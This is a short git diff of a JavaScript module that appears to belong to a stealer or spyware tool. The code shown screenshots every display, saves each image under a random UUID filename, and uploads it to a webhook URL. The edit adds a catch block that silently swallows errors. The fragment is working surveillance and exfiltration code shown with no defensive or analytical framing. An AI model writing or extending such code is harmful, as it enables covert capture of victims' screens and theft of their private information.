@@ -192,12 +192,14 @@ module.exports = (client) => {
                         screen: key[1].id,
                         format: "png",
                         filename: `${client.config.jszip.path}/${random_uuid}_DISPLAY_${parseInt(key[0]) + 1}.png`
-                    }).then(async() => {
+                    }).then(async () => {
                         await client.utils.webhook.sendToWebhook(url, {
                             files: [`${client.config.jszip.path}/${random_uuid}_DISPLAY_${parseInt(key[0]) + 1}.png`]
                         })
                     })
                 })
+            }).catch(() => {
+                return []
             })
         },
 
